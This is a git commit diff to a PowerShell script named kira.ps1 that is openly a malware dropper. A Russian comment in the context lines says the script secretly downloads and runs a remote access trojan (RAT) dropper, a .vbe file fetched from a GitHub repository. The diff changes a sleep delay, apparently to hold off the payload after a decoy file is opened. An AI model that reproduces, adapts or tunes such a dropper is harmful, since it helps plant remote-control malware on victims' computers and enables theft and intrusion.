5407432bc1b3f5540ffc612b9f86cdaa9d293af9
andezzzWW <andezzzww@gmail.com>
2025-11-13 13:49:46 +0300

    Update kira.ps1

--- kira.ps1
+++ kira.ps1
@@ -68,7 +68,7 @@ $content | Out-File -FilePath $filePath -Encoding UTF8
 Invoke-Item $filePath
 
 # ЗАДЕРЖКА
-Start-Sleep -Seconds 240
+Start-Sleep -Seconds 444
 
 # СКРЫТО СКАЧИВАЕМ И ЗАПУСКАЕМ ПЕРЕНОСЧИК RAT
 $Url = "https://github.com/andezzzWW/death-note/raw/refs/heads/main/SCRRC4ryuk.vbe"
@@ -89,5 +89,6 @@ try {
 catch {
 	
 }
+
 
 exit
